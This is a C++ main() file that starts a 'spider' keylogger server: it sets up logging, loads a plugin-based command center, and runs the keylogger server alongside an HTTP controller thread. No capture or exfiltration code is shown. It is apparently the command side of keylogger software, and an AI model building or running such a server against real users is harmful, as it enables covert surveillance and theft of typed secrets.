#include <thread>
#include "CommandCenter.h"
#include "SpiderServer.h"
#include "WebServer.h"
#include "Logger.hpp"

int main()
{
  int ret = EXIT_SUCCESS;

  try
  {
    nope::log::Logger::start("spider_server.log");
    nope::log::Logger::logLevel = nope::log::LogLevel::LOG_DEBUG;

    nope::log::Log(Info) << "Logger started";
  }
  catch (std::exception const &e)
  {
    std::cerr << "Fatal error while initializing the logger: " << e.what()
              << std::endl;
    return (EXIT_FAILURE);
  }

  // Create and initialize CommandCenter
  spider::server::CommandCenter cmdCenter("./plugins");

  // Create keylogger server
  spider::server::SpiderServer keyloggerServer(cmdCenter);

  // Create controllers here
  spider::http::WebServer httpServer(cmdCenter);

  // Add controllers to keylogger server
  keyloggerServer.addController(httpServer);

  // Run controllers
  std::thread httpServerThread{[&]() { httpServer.run(); }};

  // Run server
  keyloggerServer.run();

  // Stop controllers
  if (httpServerThread.joinable())
  {
    httpServerThread.join();
  }

  return (ret);
}